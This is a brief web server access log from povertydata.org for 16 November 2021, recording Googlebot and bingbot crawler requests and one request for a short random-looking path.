66.249.70.2 - - [16/Nov/2021:01:14:23 +0000] "POST /_dash-update-component HTTP/1.1" 200 3623 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.2 - - [16/Nov/2021:01:14:23 +0000] "GET /_dash-component-suites/dash_table/async-table.v4_11_2m1611087157.js HTTP/1.1" 200 92275 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.138 - - [16/Nov/2021:01:18:33 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
172.104.138.223 - - [16/Nov/2021:01:23:32 +0000] "GET /fuN3 HTTP/1.0" 200 13766 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
